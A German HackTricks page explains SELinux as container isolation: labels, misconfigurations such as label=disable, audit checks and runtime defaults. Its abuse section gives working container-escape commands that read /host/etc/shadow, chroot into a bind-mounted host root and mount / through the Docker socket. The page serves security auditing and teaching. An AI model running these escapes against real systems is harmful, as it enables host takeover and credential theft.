# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

SELinux ist ein **labelbasiertes Mandatory Access Control**-System. Jeder relevante Prozess und jedes relevante Objekt kann einen Sicherheitskontext tragen, und die Policy entscheidet, welche Domains mit welchen Typen interagieren dürfen und auf welche Weise. In containerisierten Umgebungen bedeutet dies normalerweise, dass die Runtime den Containerprozess unter einer eingeschränkten Container-Domain startet und den Containerinhalt mit entsprechenden Typen labelt. Wenn die Policy ordnungsgemäß funktioniert, kann der Prozess möglicherweise die Dinge lesen und schreiben, mit denen sein Label erwartungsgemäß interagieren darf, während der Zugriff auf andere Hostinhalte verweigert wird, selbst wenn diese Inhalte durch einen Mount sichtbar werden.

Dies ist eine der leistungsfähigsten verfügbaren hostseitigen Schutzmaßnahmen in gängigen Linux-Containerbereitstellungen. Sie ist besonders wichtig unter Fedora, RHEL, CentOS Stream, OpenShift und anderen SELinux-zentrierten Ökosystemen. In diesen Umgebungen wird ein Prüfer, der SELinux ignoriert, häufig missverstehen, warum ein offensichtlich wirkender Pfad zur Host-Kompromittierung tatsächlich blockiert ist.

## AppArmor Vs SELinux

Der einfachste Unterschied auf hoher Ebene besteht darin, dass AppArmor pfadbasiert ist, während SELinux **labelbasiert** ist. Das hat erhebliche Auswirkungen auf die Container-Sicherheit. Eine pfadbasierte Policy kann sich anders verhalten, wenn derselbe Hostinhalt unter einem unerwarteten Mount-Pfad sichtbar wird. Eine labelbasierte Policy fragt stattdessen, welches Label das Objekt hat und was die Prozess-Domain damit tun darf. Das macht SELinux nicht einfach, macht es aber robust gegenüber einer Klasse von Annahmen über Pfad-Tricks, die Verteidiger in AppArmor-basierten Systemen manchmal unbeabsichtigt treffen.

Da das Modell labelorientiert ist, sind die Handhabung von Container-Volumes und Entscheidungen zur Neulabelung sicherheitskritisch. Wenn die Runtime oder der Operator Labels zu umfassend ändert, um "Mounts zum Funktionieren zu bringen", kann die Policy-Grenze, die die Workload einschließen sollte, deutlich schwächer werden als beabsichtigt.

## Lab

Um festzustellen, ob SELinux auf dem Host aktiv ist:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Um vorhandene Labels auf dem Host zu überprüfen:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Um eine normale Ausführung mit einer zu vergleichen, bei der die Kennzeichnung deaktiviert ist:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Auf einem SELinux-enabled Host ist dies eine sehr praktische Demonstration, da sie den Unterschied zwischen einer Workload, die unter der erwarteten Container-Domain ausgeführt wird, und einer Workload zeigt, der diese Enforcement-Schicht entzogen wurde.

## Verwendung zur Laufzeit

Podman ist besonders gut auf SELinux abgestimmt, wenn SELinux Teil des Plattformstandards ist. Rootless Podman plus SELinux ist eine der stärksten verbreiteten Container-Baselines, da der Prozess auf der Host-Seite bereits unprivilegiert ist und weiterhin durch eine MAC-Policy eingeschränkt wird. Docker kann SELinux ebenfalls verwenden, sofern unterstützt, auch wenn Administratoren es gelegentlich deaktivieren, um Probleme bei der Volume-Kennzeichnung zu umgehen. CRI-O und OpenShift stützen sich im Rahmen ihrer Container-Isolationsstrategie stark auf SELinux. Kubernetes kann ebenfalls SELinux-bezogene Einstellungen bereitstellen, deren Wert hängt jedoch offensichtlich davon ab, ob das Betriebssystem des Nodes SELinux tatsächlich unterstützt und erzwingt.<sup>[[2]](#references)</sup>

Die wiederkehrende Erkenntnis ist, dass SELinux kein optionales Beiwerk ist. In den Ökosystemen, die darauf aufbauen, ist es Teil der erwarteten Sicherheitsgrenze.

## Fehlkonfigurationen

Der klassische Fehler ist `label=disable`. In der Praxis geschieht dies häufig, weil ein Volume-Mount verweigert wurde und die schnellste kurzfristige Lösung darin bestand, SELinux aus der Gleichung zu entfernen, anstatt das Kennzeichnungsmodell zu korrigieren.<sup>[[1]](#references)</sup> Ein weiterer häufiger Fehler ist die falsche Neukennzeichnung von Host-Inhalten. Umfassende Relabeling-Operationen können die Anwendung zwar funktionsfähig machen, aber auch den Zugriff des Containers weit über das ursprünglich Vorgesehene hinaus ausweiten.

Wichtig ist außerdem, **installiertes** SELinux nicht mit **effektivem** SELinux zu verwechseln. Ein Host kann SELinux unterstützen und sich dennoch im permissive mode befinden, oder die Runtime startet die Workload möglicherweise nicht unter der erwarteten Domain. In diesen Fällen ist der Schutz deutlich schwächer, als es die Dokumentation vermuten lässt.

## Missbrauch

Wenn SELinux für die Workload fehlt, sich im permissive mode befindet oder umfassend deaktiviert wurde, lassen sich auf dem Host gemountete Pfade deutlich leichter missbrauchen. Derselbe Bind-Mount, der andernfalls durch Labels eingeschränkt wäre, kann zu einem direkten Weg auf Host-Daten oder zu deren Veränderung werden. Dies ist besonders relevant in Kombination mit beschreibbaren Volume-Mounts, Verzeichnissen der Container-Runtime oder betrieblichen Abkürzungen, durch die aus Bequemlichkeit sensible Host-Pfade freigegeben wurden.

SELinux erklärt häufig, warum ein generisches Breakout-Writeup auf einem Host sofort funktioniert, auf einem anderen jedoch wiederholt fehlschlägt, obwohl die Runtime-Flags ähnlich aussehen. Die fehlende Komponente ist oft weder ein Namespace noch eine Capability, sondern eine Label-Grenze, die intakt geblieben ist.

Die schnellste praktische Prüfung besteht darin, den aktiven Context zu vergleichen und anschließend gemountete Host-Pfade oder Runtime-Verzeichnisse zu untersuchen, die normalerweise durch Labels eingeschränkt wären:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Wenn ein Host-Bind-Mount vorhanden ist und die SELinux-Kennzeichnung deaktiviert oder abgeschwächt wurde, kommt es häufig zuerst zur Offenlegung von Informationen:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Wenn der Mount beschreibbar ist und der Container aus Sicht des Kernels effektiv host-root ist, besteht der nächste Schritt darin, eine kontrollierte Änderung am Host zu testen, statt zu raten:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Auf SELinux-fähigen Hosts kann der Verlust von Labels rund um Verzeichnisse für den Laufzeitstatus auch direkte Privilege-Escalation-Pfade offenlegen:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Diese Befehle ersetzen keine vollständige escape chain, machen aber sehr schnell deutlich, ob SELinux den Zugriff auf Host-Daten oder die Änderung von Dateien auf dem Host verhindert hat.

### Vollständiges Beispiel: SELinux deaktiviert + beschreibbarer Host-Mount

Wenn das SELinux-Labeling deaktiviert ist und das Host-Dateisystem unter `/host` beschreibbar gemountet wurde, wird ein vollständiger host escape zu einem normalen Fall von bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn `chroot` erfolgreich ist, arbeitet der Containerprozess nun vom Host-Dateisystem aus:
```bash
id
hostname
cat /etc/passwd | tail
```
### Vollständiges Beispiel: SELinux deaktiviert + Laufzeitverzeichnis

Wenn der Workload einen Runtime-Socket erreichen kann, sobald Labels deaktiviert sind, kann der Escape an die Runtime delegiert werden:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante Beobachtung ist, dass SELinux häufig die Kontrolle war, die genau diese Art des Zugriffs auf Host-Pfade oder Laufzeitstatus verhinderte.

## Prüfungen

Ziel der SELinux-Prüfungen ist es, zu bestätigen, dass SELinux aktiviert ist, den aktuellen Sicherheitskontext zu ermitteln und zu prüfen, ob die für dich relevanten Dateien oder Pfade tatsächlich durch Labels eingeschränkt sind.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Was ist hier interessant:

- `getenforce` sollte idealerweise `Enforcing` zurückgeben; `Permissive` oder `Disabled` verändert die Bedeutung des gesamten SELinux-Abschnitts.
- Wenn der Context des aktuellen Prozesses unerwartet oder zu weit gefasst wirkt, läuft der Workload möglicherweise nicht unter der vorgesehenen Container-Policy.
- Wenn auf dem Host eingehängte Dateien oder Runtime-Verzeichnisse Labels haben, auf die der Prozess zu frei zugreifen kann, werden bind mounts deutlich gefährlicher.

Bei der Überprüfung eines Containers auf einer SELinux-fähigen Plattform sollte Labeling nicht als nebensächliches Detail behandelt werden. In vielen Fällen ist es einer der Hauptgründe dafür, dass der Host nicht bereits kompromittiert wurde.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Vom Host abhängig | Die SELinux-Trennung ist auf SELinux-fähigen Hosts verfügbar, das genaue Verhalten hängt jedoch von der Host-/Daemon-Konfiguration ab | `--security-opt label=disable`, umfangreiches Relabeling von bind mounts, `--privileged` |
| Podman | Auf SELinux-Hosts üblicherweise aktiviert | Die SELinux-Trennung ist auf SELinux-Systemen normalerweise Bestandteil von Podman, sofern sie nicht deaktiviert wurde | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Auf Pod-Ebene im Allgemeinen nicht automatisch zugewiesen | SELinux-Unterstützung ist vorhanden, Pods benötigen jedoch üblicherweise `securityContext.seLinuxOptions` oder plattformspezifische Standardeinstellungen; Runtime- und Node-Unterstützung sind erforderlich | Schwache oder zu weit gefasste `seLinuxOptions`, Ausführung auf permissive/deaktivierten Nodes, Plattform-Policies, die Labeling deaktivieren |
| CRI-O / OpenShift-style Deployments | Häufig stark darauf angewiesen | SELinux ist in diesen Umgebungen oft ein zentraler Bestandteil des Node-Isolationsmodells | Benutzerdefinierte Policies, die den Zugriff zu weit ausdehnen, Deaktivierung des Labelings aus Kompatibilitätsgründen |

SELinux-Standardeinstellungen hängen stärker von der Distribution ab als seccomp-Standardeinstellungen. Auf Fedora-/RHEL-/OpenShift-style-Systemen ist SELinux oft zentral für das Isolationsmodell. Auf Nicht-SELinux-Systemen ist es schlicht nicht vorhanden.

## Referenzen

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
